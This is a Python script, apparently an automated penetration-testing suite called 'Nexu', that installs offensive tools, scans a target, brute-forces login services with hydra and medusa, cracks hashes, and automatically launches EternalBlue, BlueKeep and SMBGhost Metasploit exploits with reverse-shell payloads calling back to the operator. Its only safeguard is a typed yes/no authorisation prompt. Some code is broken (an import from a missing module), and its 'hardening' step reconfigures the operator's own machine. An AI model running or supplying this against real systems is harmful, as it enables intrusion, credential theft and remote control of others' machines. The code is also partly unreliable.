#!/usr/bin/env python3
"""
Nexu - Fully Automated Penetration Testing & Hardening Suite
All-in-one tool: Reconnaissance, Exploitation, Cracking, Defence.
Mandatory tools are auto-installed if missing.
Requires explicit written authorisation.
"""

import argparse
import datetime
import json
import logging
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse
from xml.etree import ElementTree

# ------------------------------------------------------------------------------
# Logging
# ------------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("nexu.log"), logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("nexu")

# ------------------------------------------------------------------------------
# Comprehensive tool set
# ------------------------------------------------------------------------------
REQUIRED_TOOLS = [
    # Network scanning
    "nmap", "masscan", "arp-scan", "netcat",
    # DNS & subdomain
    "theHarvester", "amass", "subfinder", "dnsrecon", "whois",
    # Web recon / fuzzing
    "whatweb", "gobuster", "ffuf", "dirsearch", "wpscan", "dalfox",
    # Frameworks & spiders
    "recon-ng", "spiderfoot",
    # Cracking
    "hydra", "medusa", "john", "hashcat", "hashid",
    # Wordlist / password tools
    "cewl", "crunch",
    # Exploitation
    "msfconsole", "sqlmap", "nikto",
    # Wireless
    "aircrack-ng", "reaver", "kismet",
    # Traffic / monitoring (optional but listed)
    "tcpdump", "wireshark",
]

# Tool → apt package mapping (for auto-install)
APT_PACKAGES = {
    "theHarvester": "theharvester",
    "amass": "amass",
    "subfinder": "subfinder",
    "dnsrecon": "dnsrecon",
    "whatweb": "whatweb",
    "whois": "whois",
    "recon-ng": "recon-ng",
    "spiderfoot": "spiderfoot",
    "gobuster": "gobuster",
    "ffuf": "ffuf",
    "dirsearch": "dirsearch",
    "wpscan": "wpscan",
    "dalfox": "dalfox",
    "arp-scan": "arp-scan",
    "netcat": "netcat-openbsd",
    "tcpdump": "tcpdump",
    "wireshark": "wireshark",
    "cewl": "cewl",
    "crunch": "crunch",
    "hashid": "hashid",
    "medusa": "medusa",
    "john": "john",
    "hashcat": "hashcat",
    "hydra": "hydra",
    "aircrack-ng": "aircrack-ng",
    "reaver": "reaver",
    "kismet": "kismet",
    "nmap": "nmap",
    "masscan": "masscan",
    "nikto": "nikto",
    "sqlmap": "sqlmap",
    "msfconsole": "metasploit-framework",
}

BRUTE_SERVICES = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
    110: "pop3", 143: "imap", 3306: "mysql", 5432: "postgres",
    3389: "rdp", 1433: "mssql", 1521: "oracle", 27017: "mongodb",
}
WEB_PORTS = {80, 443, 8080, 8443, 8000, 8888, 9090}
FALLBACK_USERS = ["admin", "root", "user", "test", "guest"]
FALLBACK_PASSWORDS = ["admin", "123456", "password", "toor", "letmein"]
DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"

# ------------------------------------------------------------------------------
# Helpers
# ------------------------------------------------------------------------------
def check_tool(name: str) -> bool:
    return shutil.which(name) is not None

def install_tool(name: str) -> bool:
    pkg = APT_PACKAGES.get(name, name)
    logger.info("Attempting to install %s (package %s)", name, pkg)
    try:
        subprocess.run(
            f"sudo apt-get install -y {pkg}",
            shell=True, check=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        return check_tool(name)
    except subprocess.CalledProcessError:
        return False

def ensure_all_tools():
    missing = [t for t in REQUIRED_TOOLS if not check_tool(t)]
    if not missing:
        return
    logger.warning("Missing tools: %s. Attempting auto-install...", ", ".join(missing))
    for tool in missing:
        if not install_tool(tool):
            logger.error("Failed to install %s. Exiting.", tool)
            sys.exit(1)
    logger.info("All required tools are now available.")

def validate_target(target: str) -> str:
    if target.startswith("http://") or target.startswith("https://"):
        return urlparse(target).hostname
    return target

def create_temp_wordlist(items: List[str], prefix: str) -> str:
    fd, path = tempfile.mkstemp(prefix=f"{prefix}_", suffix=".txt")
    with os.fdopen(fd, "w") as f:
        f.write("\n".join(items))
    return path

def run_cmd(cmd: str, timeout: Optional[int] = None) -> Optional[str]:
    """Execute shell command, return stdout or None on failure."""
    try:
        result = subprocess.run(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, timeout=timeout
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd}")
    except Exception as e:
        logger.error(f"Command failed: {cmd} – {e}")
    return None

def get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# ------------------------------------------------------------------------------
# Port scanning (Masscan)
# ------------------------------------------------------------------------------
class MasscanScanner:
    def __init__(self, target: str, output_dir: Path, rate: int = 10000):
        self.target = target
        self.output_file = output_dir / "masscan.gnmap"
        self.rate = rate

    def run(self) -> List[int]:
        logger.info("Masscan scanning %s ...", self.target)
        run_cmd(f"masscan {self.target} -p1-65535 --rate={self.rate} -oG {self.output_file}")
        return self._parse()

    def _parse(self) -> List[int]:
        ports = []
        try:
            with open(self.output_file) as fh:
                for line in fh:
                    if not line.startswith("#"):
                        ports.extend(int(p) for p in re.findall(r"(\d+)/open", line))
        except FileNotFoundError:
            logger.error("Masscan output missing")
        return sorted(set(ports))

# ------------------------------------------------------------------------------
# ARP scan (local network)
# ------------------------------------------------------------------------------
class ARPScanner:
    def __init__(self, output_dir: Path):
        self.output_file = output_dir / "arp_scan.txt"

    def run(self) -> List[str]:
        logger.info("ARP scanning local network...")
        out = run_cmd("arp-scan --localnet")
        if out:
            self.output_file.write_text(out)
            return re.findall(r"\d+\.\d+\.\d+\.\d+", out)
        return []

# ------------------------------------------------------------------------------
# DNS / subdomain recon
# ------------------------------------------------------------------------------
class DNSRecon:
    def __init__(self, domain: str, output_dir: Path):
        self.domain = domain
        self.output_dir = output_dir

    def run_all(self):
        # theHarvester
        logger.info("theHarvester gathering %s", self.domain)
        run_cmd(f"theHarvester -d {self.domain} -b all -f {self.output_dir / 'harvester.html'}")

        # Amass
        logger.info("Amass enumerating %s", self.domain)
        run_cmd(f"amass enum -d {self.domain} -o {self.output_dir / 'amass.txt'}")

        # subfinder
        logger.info("Subfinder scanning %s", self.domain)
        run_cmd(f"subfinder -d {self.domain} -o {self.output_dir / 'subfinder.txt'}")

        # dnsrecon
        logger.info("dnsrecon scanning %s", self.domain)
        run_cmd(f"dnsrecon -d {self.domain} -t axfr --csv {self.output_dir / 'dnsrecon.csv'}")

        # whois
        logger.info("whois lookup for %s", self.domain)
        run_cmd(f"whois {self.domain} > {self.output_dir / 'whois.txt'}")

        # whatweb
        logger.info("whatweb on %s", self.domain)
        run_cmd(f"whatweb https://{self.domain} --log-verbose={self.output_dir / 'whatweb.txt'}")

# ------------------------------------------------------------------------------
# Web content discovery (gobuster, ffuf, dirsearch, wpscan, dalfox)
# ------------------------------------------------------------------------------
class WebContentDiscovery:
    def __init__(self, target: str, port: int, ssl: bool, output_dir: Path):
        self.url = f"{'https' if ssl else 'http'}://{target}:{port}"
        self.output_dir = output_dir
        self.port = port

    def run_all(self):
        base_dir = self.output_dir / f"web_{self.port}"
        base_dir.mkdir(exist_ok=True)

        # gobuster
        logger.info("Gobuster scanning %s", self.url)
        run_cmd(f"gobuster dir -u {self.url} -w /usr/share/wordlists/dirb/common.txt -o {base_dir / 'gobuster.txt'}")

        # ffuf
        logger.info("ffuf fuzzing %s", self.url)
        run_cmd(f"ffuf -u {self.url}/FUZZ -w /usr/share/wordlists/dirb/common.txt -o {base_dir / 'ffuf.json'} -of json")

        # dirsearch
        logger.info("dirsearch scanning %s", self.url)
        run_cmd(f"dirsearch -u {self.url} -e php,html,js,txt --json-report={base_dir / 'dirsearch.json'}")

        # wpscan (only if port likely HTTP/HTTPS)
        if self.port in (80, 443, 8080, 8443):
            logger.info("WPScan on %s", self.url)
            run_cmd(f"wpscan --url {self.url} --ignore-main-redirect --format json --output {base_dir / 'wpscan.json'}")

        # dalfox (XSS scanner)
        logger.info("Dalfox scanning %s", self.url)
        run_cmd(f"dalfox url {self.url} --output {base_dir / 'dalfox.txt'}")

# ------------------------------------------------------------------------------
# Recon frameworks (recon-ng, spiderfoot)
# ------------------------------------------------------------------------------
class ReconFrameworks:
    def __init__(self, domain: str, output_dir: Path):
        self.domain = domain
        self.output_dir = output_dir

    def run_all(self):
        # recon-ng (automated)
        logger.info("recon-ng gathering %s", self.domain)
        rc_script = self.output_dir / "recon_script.rc"
        with open(rc_script, "w") as f:
            f.write(f"workspaces create nexu_{self.domain}\n")
            f.write(f"add domains {self.domain}\n")
            f.write("modules load recon/domains-hosts/bing_domain_api\n")
            f.write("run\n")
            f.write("modules load reporting/list/hosts\n")
            f.write("run\n")
            f.write("exit\n")
        run_cmd(f"recon-ng -r {rc_script} > {self.output_dir / 'recon_ng.txt'}")

        # spiderfoot
        logger.info("spiderfoot scanning %s", self.domain)
        run_cmd(f"spiderfoot -s {self.domain} -o {self.output_dir / 'spiderfoot.json'}")

# ------------------------------------------------------------------------------
# Nmap (unchanged but enhanced)
# ------------------------------------------------------------------------------
class NmapScanner:
    def __init__(self, target: str, output_dir: Path, ports: Optional[List[int]] = None):
        self.target = target
        self.output_dir = output_dir
        self.xml_path = output_dir / "nmap.xml"
        self.ports = ports

    def run(self) -> List[Dict]:
        port_arg = ",".join(map(str, self.ports)) if self.ports else "1-1000"
        logger.info("Nmap scanning %s ...", self.target)
        run_cmd(
            f"nmap -p {port_arg} -sV -sC -O --script vuln "
            f"--min-rate 1000 -oX {self.xml_path} {self.target}"
        )
        return self._parse_services()

    def _parse_services(self) -> List[Dict]:
        services = []
        if not self.xml_path.exists():
            return services
        try:
            tree = ElementTree.parse(self.xml_path)
            for port_elem in tree.findall(".//port"):
                state = port_elem.find("state")
                if state is not None and state.get("state") == "open":
                    srv = port_elem.find("service")
                    services.append({
                        "port": int(port_elem.get("portid", 0)),
                        "service": srv.get("name") if srv is not None else "unknown",
                        "product": srv.get("product", "") if srv is not None else "",
                        "version": srv.get("version", "") if srv is not None else "",
                    })
        except Exception as e:
            logger.error("Nmap XML parse error: %s", e)
        return services

    def check_vuln_script(self, keyword: str) -> bool:
        if not self.xml_path.exists():
            return False
        try:
            return keyword.lower() in self.xml_path.read_text().lower()
        except Exception:
            return False

# ------------------------------------------------------------------------------
# Password tools (cewl, crunch, hashid)
# ------------------------------------------------------------------------------
class PasswordTools:
    def __init__(self, target: str, output_dir: Path):
        self.target = target
        self.output_dir = output_dir

    def run_cewl(self, url: str):
        logger.info("CeWL crawling %s", url)
        run_cmd(f"cewl {url} -w {self.output_dir / 'cewl_words.txt'}")

    def run_crunch(self, min_len=6, max_len=8, pattern: Optional[str] = None):
        logger.info("Crunch generating wordlist")
        if pattern:
            run_cmd(f"crunch {min_len} {max_len} -t {pattern} -o {self.output_dir / 'crunch_words.txt'}")
        else:
            run_cmd(f"crunch {min_len} {max_len} -o {self.output_dir / 'crunch_words.txt'}")

    def identify_hash(self, hash_file: Path):
        if not hash_file.exists():
            return
        logger.info("Hashid identifying hashes")
        run_cmd(f"hashid {hash_file} > {self.output_dir / 'hashid_output.txt'}")

# ------------------------------------------------------------------------------
# Cracking suite (Hydra, Medusa, John, Hashcat)
# ------------------------------------------------------------------------------
class HydraCracker:
    def __init__(self, target: str, output_dir: Path, wordlist: Optional[str] = None):
        self.target = target
        self.output_dir = output_dir
        self.wordlist = self._get_wordlist(wordlist)

    def _get_wordlist(self, wordlist: Optional[str]) -> str:
        if wordlist and os.path.isfile(wordlist):
            return wordlist
        if os.path.isfile(DEFAULT_WORDLIST):
            return DEFAULT_WORDLIST
        logger.warning("Using built‑in fallback wordlist")
        return create_temp_wordlist(FALLBACK_PASSWORDS, "nexu_pass")

    def brute_service(self, service: str, port: int):
        out = self.output_dir / f"hydra_{service}_{port}.txt"
        run_cmd(
            f"hydra -L {self.wordlist} -P {self.wordlist} "
            f"{service}://{self.target} -s {port} -o {out} -t 64 -f"
        )

    def run(self, services: List[Dict]):
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for srv in services:
                if srv["port"] in BRUTE_SERVICES:
                    futures.append(executor.submit(self.brute_service, BRUTE_SERVICES[srv["port"]], srv["port"]))
            for future in as_completed(futures):
                future.result()

class MedusaCracker:
    def __init__(self, target: str, output_dir: Path, wordlist: Optional[str] = None):
        self.target = target
        self.output_dir = output_dir
        self.wordlist = wordlist if wordlist and os.path.isfile(wordlist) else DEFAULT_WORDLIST

    def brute_service(self, service: str, port: int):
        logger.info("Medusa attacking %s on port %d", service, port)
        run_cmd(
            f"medusa -h {self.target} -p {port} -M {service} "
            f"-U {self.wordlist} -P {self.wordlist} -t 64 -f "
            f"-O {self.output_dir / f'medusa_{service}_{port}.txt'}"
        )

    def run(self, services: List[Dict]):
        for srv in services:
            if srv["port"] in BRUTE_SERVICES:
                self.brute_service(BRUTE_SERVICES[srv["port"]], srv["port"])

class JohnCracker:
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.hash_file = output_dir / "captured_hashes.txt"

    def crack(self, wordlist: Optional[str] = None):
        if not self.hash_file.exists():
            return
        wl = wordlist if wordlist and os.path.isfile(wordlist) else DEFAULT_WORDLIST
        run_cmd(f"john --wordlist={wl} {self.hash_file}")
        run_cmd(f"john --show {self.hash_file} > {self.output_dir / 'john_cracked.txt'}")

class HashcatCracker:
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir

    def crack(self, hash_file: Path, hash_type: int = 0):
        if not hash_file.exists():
            return
        run_cmd(f"hashcat -m {hash_type} -a 0 {hash_file} {DEFAULT_WORDLIST} --force")

# ------------------------------------------------------------------------------
# Exploit manager (MSF)
# ------------------------------------------------------------------------------
class ExploitManager:
    def __init__(self, target: str, output_dir: Path, lhost: Optional[str] = None):
        self.target = target
        self.output_dir = output_dir
        self.lhost = lhost or get_local_ip()
        self.lports = [4444, 4445, 4446]

    def _write_and_run_rc(self, name: str, commands: List[str]):
        rc_path = self.output_dir / f"{name}.rc"
        with open(rc_path, "w") as f:
            f.write("\n".join(commands))
        run_cmd(f"msfconsole -q -r {rc_path}")

    def exploit_eternalblue(self):
        commands = [
            "use exploit/windows/smb/ms17_010_eternalblue",
            f"set RHOSTS {self.target}",
            f"set PAYLOAD windows/x64/shell/reverse_tcp",
            f"set LHOST {self.lhost}",
            f"set LPORT {self.lports[0]}",
            "exploit -j", "sleep 20", "sessions -l", "exit",
        ]
        self._write_and_run_rc("eternalblue", commands)

    def exploit_bluekeep(self):
        commands = [
            "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            f"set RHOSTS {self.target}",
            f"set PAYLOAD windows/x64/shell/reverse_tcp",
            f"set LHOST {self.lhost}",
            f"set LPORT {self.lports[1]}",
            "exploit -j", "sleep 20", "exit",
        ]
        self._write_and_run_rc("bluekeep", commands)

    def exploit_smbghost(self):
        commands = [
            "use exploit/windows/smb/cve_2020_0796_smbghost",
            f"set RHOSTS {self.target}",
            f"set PAYLOAD windows/x64/shell/reverse_tcp",
            f"set LHOST {self.lhost}",
            f"set LPORT {self.lports[2]}",
            "exploit -j", "sleep 20", "exit",
        ]
        self._write_and_run_rc("smbghost", commands)

    def run_auto(self, nmap: NmapScanner):
        if nmap.check_vuln_script("ms17-010"):
            self.exploit_eternalblue()
        if nmap.check_vuln_script("cve-2019-0708") or nmap.check_vuln_script("bluekeep"):
            self.exploit_bluekeep()
        if nmap.check_vuln_script("cve-2020-0796") or nmap.check_vuln_script("smbghost"):
            self.exploit_smbghost()

# ------------------------------------------------------------------------------
# Wireless attacks (optional)
# ------------------------------------------------------------------------------
class WirelessAttack:
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir

    def run(self, interface: str = "wlan0"):
        logger.info("Starting wireless assessment on %s", interface)
        # aircrack-ng basics
        run_cmd(f"airmon-ng start {interface}")
        run_cmd(f"airodump-ng {interface}mon -w {self.output_dir / 'airodump'}")
        # Placeholder for reaver and kismet – they usually require interaction
        logger.warning("Air tools require manual interaction, skipping automated attacks.")

# ------------------------------------------------------------------------------
# Patch checker
# ------------------------------------------------------------------------------
class PatchChecker:
    def check(self, services: List[Dict]) -> List[str]:
        recs = []
        for srv in services:
            if srv["service"] == "ssh" and srv["version"].startswith("7."):
                recs.append("SSH < 8.0 vulnerable, update immediately.")
            if srv["port"] == 445:
                recs.append("SMB exposed, apply all critical patches (MS17-010, SMBGhost, etc.).")
            if srv["port"] == 3389:
                recs.append("RDP exposed, ensure NLA and latest updates (BlueKeep, BlueRage).")
        return recs

# ------------------------------------------------------------------------------
# Auto‑hardening
# ------------------------------------------------------------------------------
class AutoHardening:
    def apply(self):
        logger.info("Applying basic system hardening...")
        run_cmd("sudo apt update -y")
        run_cmd("sudo apt install unattended-upgrades fail2ban -y")
        run_cmd("sudo ufw enable")
        run_cmd("sudo ufw default deny incoming")
        run_cmd("sudo ufw default allow outgoing")

# ------------------------------------------------------------------------------
# Report generator
# ------------------------------------------------------------------------------
class ReportGenerator:
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir

    def generate(self, target: str, services: List[Dict], recommendations: List[str]):
        report = {
            "target": target,
            "timestamp": datetime.datetime.now().isoformat(),
            "services": services,
            "recommendations": recommendations,
        }
        report_path = self.output_dir / "nexu_report.json"
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2)
        logger.info("Report written to %s", report_path)

# ------------------------------------------------------------------------------
# Main orchestrator
# ------------------------------------------------------------------------------
class NexuOrchestrator:
    def __init__(self, target: str, full_auto: bool = True, safe_mode: bool = False,
                 output_dir: str = "nexu_results", wordlist: Optional[str] = None,
                 wireless: bool = False):
        self.target = validate_target(target)
        self.full_auto = full_auto
        self.safe_mode = safe_mode
        self.wireless = wireless
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.wordlist = wordlist
        self.services = []
        self.web_targets = []

    def _identify_web_targets(self):
        for srv in self.services:
            if srv["port"] in WEB_PORTS or "http" in srv["service"]:
                ssl = srv["port"] in (443, 8443) or "https" in srv["service"]
                self.web_targets.append((srv["port"], ssl))

    def run(self):
        # Ensure every tool is present
        ensure_all_tools()

        # --- Phase 0: DNS & domain recon (if target is a domain) ---
        if not self.target.replace(".", "").isdigit():
            dns_recon = DNSRecon(self.target, self.output_dir)
            dns_recon.run_all()
            frameworks = ReconFrameworks(self.target, self.output_dir)
            frameworks.run_all()

        # ARP scan (local only)
        ARPScanner(self.output_dir).run()

        # CeWL / crunch / hashid (wordlist generation)
        pwd_tools = PasswordTools(self.target, self.output_dir)
        if not self.target.replace(".", "").isdigit():
            pwd_tools.run_cewl(f"https://{self.target}")
        pwd_tools.run_crunch()
        pwd_tools.identify_hash(self.output_dir / "captured_hashes.txt")

        # --- Phase 1: Masscan + Nmap ---
        masscan = MasscanScanner(self.target, self.output_dir)
        open_ports = masscan.run()
        logger.info("Masscan found %d open ports", len(open_ports))

        nmap = NmapScanner(self.target, self.output_dir, open_ports)
        self.services = nmap.run()
        self._identify_web_targets()

        # --- Phase 2: Web scanning (Nikto, SQLMap, content discovery) ---
        if self.web_targets:
            with ThreadPoolExecutor(max_workers=10) as executor:
                for port, ssl in self.web_targets:
                    # Web content discovery (gobuster, ffuf, dirsearch, wpscan, dalfox)
                    executor.submit(WebContentDiscovery(self.target, port, ssl, self.output_dir).run_all)
                    # Nikto & SQLMap via WebScanner
                    from scanners import WebScanner  # Reuse existing class (def below)
                    ws = WebScanner(self.target, port, ssl, self.output_dir)
                    executor.submit(ws.run)
                    # dalfox already included above; wpscan also

        # --- Phase 3: Exploitation (if full auto) ---
        if self.full_auto and not self.safe_mode:
            exploit = ExploitManager(self.target, self.output_dir)
            exploit.run_auto(nmap)

        # --- Phase 4: Aggressive cracking (Hydra, Medusa, John, Hashcat) ---
        if self.full_auto and not self.safe_mode:
            hydra = HydraCracker(self.target, self.output_dir, self.wordlist)
            hydra.run(self.services)
            medusa = MedusaCracker(self.target, self.output_dir, self.wordlist)
            medusa.run(self.services)
            john = JohnCracker(self.output_dir)
            john.crack()
            hashcat = HashcatCracker(self.output_dir)
            hashcat.crack(self.output_dir / "captured_hashes.txt")

        # --- Phase 5: Wireless (if enabled) ---
        if self.wireless:
            WirelessAttack(self.output_dir).run()

        # --- Phase 6: Patch check & hardening ---
        patch = PatchChecker()
        recs = patch.check(self.services)
        if self.full_auto and not self.safe_mode:
            AutoHardening().apply()
            recs.append("Basic hardening applied (UFW, fail2ban, unattended upgrades).")

        # Report
        ReportGenerator(self.output_dir).generate(self.target, self.services, recs)
        logger.info("Nexu fully automatic cycle completed.")

# ------------------------------------------------------------------------------
# WebScanner redefinition (to keep code self-contained)
# ------------------------------------------------------------------------------
class WebScanner:
    def __init__(self, target, port, ssl, output_dir):
        self.url = f"{'https' if ssl else 'http'}://{target}:{port}"
        self.output_dir = output_dir

    def run(self):
        logger.info("Nikto on %s", self.url)
        run_cmd(f"nikto -h {self.url} -output {self.output_dir / f'nikto_{self.url.split('/')[-1]}.txt'}")
        logger.info("SQLMap on %s", self.url)
        run_cmd(f"sqlmap -u {self.url} --batch --random-agent --crawl=2 --forms --output-dir={self.output_dir / 'sqlmap'} --threads=4")

# ------------------------------------------------------------------------------
# CLI
# ------------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Nexu – Fully Automated Pentesting & Hardening Suite")
    parser.add_argument("-t", "--target", required=True, help="Target IP or domain")
    parser.add_argument("--safe", action="store_true", help="Reconnaissance only")
    parser.add_argument("-o", "--output", default="nexu_results", help="Output directory")
    parser.add_argument("-w", "--wordlist", help="Custom wordlist for cracking")
    parser.add_argument("--wireless", action="store_true", help="Enable wireless attacks")
    args = parser.parse_args()

    print("\n[!] You must have explicit written authorisation to test the target.")
    consent = input("Do you have such authorisation? (yes/no): ")
    if consent.lower() not in ("yes", "y"):
        sys.exit(0)

    orchestrator = NexuOrchestrator(
        target=args.target,
        full_auto=not args.safe,
        safe_mode=args.safe,
        output_dir=args.output,
        wordlist=args.wordlist,
        wireless=args.wireless,
    )

    try:
        orchestrator.run()
    except KeyboardInterrupt:
        logger.warning("Interrupted by user.")
    except Exception as e:
        logger.critical("Fatal error: %s", e)
    finally:
        sys.exit(0)

if __name__ == "__main__":
    main()
